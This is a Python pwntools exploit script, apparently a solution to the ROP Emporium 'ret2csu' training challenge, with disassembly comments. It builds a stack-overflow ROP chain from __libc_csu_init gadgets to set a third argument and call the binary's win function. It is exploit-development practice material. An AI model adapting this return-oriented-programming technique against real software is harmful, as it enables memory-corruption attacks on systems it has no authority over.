#!/usr/bin/python

# https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html

from pwn import *

s = process('./ret2csu')
s.clean()

# Call ret2win()
# The third argument (rdx) must be 0xdeadcafebabebeef

# Going to use gadgets from function:
# 0x0000000000400840  __libc_csu_init


# 0x000000000040089a <+90>:	pop    rbx
# 0x000000000040089b <+91>:	pop    rbp
# 0x000000000040089c <+92>:	pop    r12
# 0x000000000040089e <+94>:	pop    r13
# 0x00000000004008a0 <+96>:	pop    r14
# 0x00000000004008a2 <+98>:	pop    r15
# 0x00000000004008a4 <+100>:	ret    
pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15 = 0x40089a

# 0x0000000000400880 <+64>:	mov    rdx,r15
# 0x0000000000400883 <+67>:	mov    rsi,r14
# 0x0000000000400886 <+70>:	mov    edi,r13d
# 0x0000000000400889 <+73>:	call   QWORD PTR [r12+rbx*8]  <-------------------  (1) !  need [r12+rbx*8] == some valid func 
# 0x000000000040088d <+77>:	add    rbx,0x1
# 0x0000000000400891 <+81>:	cmp    rbp,rbx                <-------------------  (2) !  need rbp == rbx-0x1
# 0x0000000000400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
# 0x0000000000400896 <+86>:	add    rsp,0x8
# 0x000000000040089a <+90>:	pop    rbx
# 0x000000000040089b <+91>:	pop    rbp
# 0x000000000040089c <+92>:	pop    r12
# 0x000000000040089e <+94>:	pop    r13
# 0x00000000004008a0 <+96>:	pop    r14
# 0x00000000004008a2 <+98>:	pop    r15
# 0x00000000004008a4 <+100>:	ret   
mov_rdx_r15_mov_rsi_r14_mov_edi_r13d = 0x400880

# (1) 
# We will use addr with addr of init func:
# gdb-peda$ x/5g &_DYNAMIC
# 0x600e20:	0x1	0x1
# 0x600e30:	0xc	0x400560
# 0x600e40:	0xd
# gdb-peda$ telescope 0x400560
# 0000| 0x400560 (<_init>:	sub    rsp,0x8)
# 0008| 0x400568 (<_init+8>:	or     ah,BYTE PTR [rax])
# 0016| 0x400570 (<_init+16>:	call   rax)
init_ptr = 0x600e38

ret2win = 0x4007b1

payload = 'A' * 40
payload += p64(pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15)
payload += p64(0)
payload += p64(1)
payload += p64(init_ptr)
payload += 'BBBBBBBB'
payload += 'BBBBBBBB'
payload += p64(0xdeadcafebabebeef)
payload += p64(mov_rdx_r15_mov_rsi_r14_mov_edi_r13d)
payload += 'BBBBBBBB' * 6
payload += 'BBBBBBBB'             # need extra trash because of this line: 0x0000000000400896 <+86>: add  rsp,0x8
payload += p64(ret2win)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+156
""")
'''

s.sendline(payload)
s.interactive()



'''
gdb-peda$ disass __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400840 <+0>:	push   r15
   0x0000000000400842 <+2>:	push   r14
   0x0000000000400844 <+4>:	mov    r15,rdx
   0x0000000000400847 <+7>:	push   r13
   0x0000000000400849 <+9>:	push   r12
   0x000000000040084b <+11>:	lea    r12,[rip+0x2005be]        # 0x600e10
   0x0000000000400852 <+18>:	push   rbp
   0x0000000000400853 <+19>:	lea    rbp,[rip+0x2005be]        # 0x600e18
   0x000000000040085a <+26>:	push   rbx
   0x000000000040085b <+27>:	mov    r13d,edi
   0x000000000040085e <+30>:	mov    r14,rsi
   0x0000000000400861 <+33>:	sub    rbp,r12
   0x0000000000400864 <+36>:	sub    rsp,0x8
   0x0000000000400868 <+40>:	sar    rbp,0x3
   0x000000000040086c <+44>:	call   0x400560 <_init>
   0x0000000000400871 <+49>:	test   rbp,rbp
   0x0000000000400874 <+52>:	je     0x400896 <__libc_csu_init+86>
   0x0000000000400876 <+54>:	xor    ebx,ebx
   0x0000000000400878 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400880 <+64>:	mov    rdx,r15
   0x0000000000400883 <+67>:	mov    rsi,r14
   0x0000000000400886 <+70>:	mov    edi,r13d
   0x0000000000400889 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040088d <+77>:	add    rbx,0x1
   0x0000000000400891 <+81>:	cmp    rbp,rbx
   0x0000000000400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
   0x0000000000400896 <+86>:	add    rsp,0x8
   0x000000000040089a <+90>:	pop    rbx
   0x000000000040089b <+91>:	pop    rbp
   0x000000000040089c <+92>:	pop    r12
   0x000000000040089e <+94>:	pop    r13
   0x00000000004008a0 <+96>:	pop    r14
   0x00000000004008a2 <+98>:	pop    r15
   0x00000000004008a4 <+100>:	ret    
End of assembler dump.
'''

